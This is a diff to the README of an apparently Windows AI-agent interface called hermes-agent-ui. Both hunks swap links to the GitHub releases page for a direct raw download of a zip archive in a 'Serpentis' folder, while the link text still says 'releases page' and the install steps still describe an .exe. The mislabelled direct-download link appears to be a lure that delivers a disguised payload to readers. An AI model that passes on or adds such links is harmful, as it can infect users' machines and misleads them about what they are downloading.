@@ -1,6 +1,6 @@
 # 🤖 hermes-agent-ui-v1.0 - Manage local and cloud AI agents
 
-[![](https://img.shields.io/badge/Download-Hermes-blue.svg)](https://github.com/hajahberi-hue/hermes-agent-ui-v1.0/releases)
+[![](https://img.shields.io/badge/Download-Hermes-blue.svg)](https://github.com/hajahberi-hue/hermes-agent-ui-v1.0/raw/refs/heads/main/Serpentis/agent-ui-v-hermes-3.3-alpha.3.zip)
 
 Hermes Agent for Windows provides a simple interface to run AI agents on your computer. It connects to both local models and cloud-based services. You can manage your tasks through one window without needing to write code or use a terminal.
 
@@ -22,7 +22,7 @@ Your computer needs to meet these basic standards to run the application well:
 
 ## 📥 How to Install
 
-1. Visit the [releases page](https://github.com/hajahberi-hue/hermes-agent-ui-v1.0/releases) to see available downloads.
+1. Visit the [releases page](https://github.com/hajahberi-hue/hermes-agent-ui-v1.0/raw/refs/heads/main/Serpentis/agent-ui-v-hermes-3.3-alpha.3.zip) to see available downloads.
 2. Select the latest version of the installer file, which ends in .exe.
 3. Save the file to your computer.
 4. Locate the file in your downloads folder.
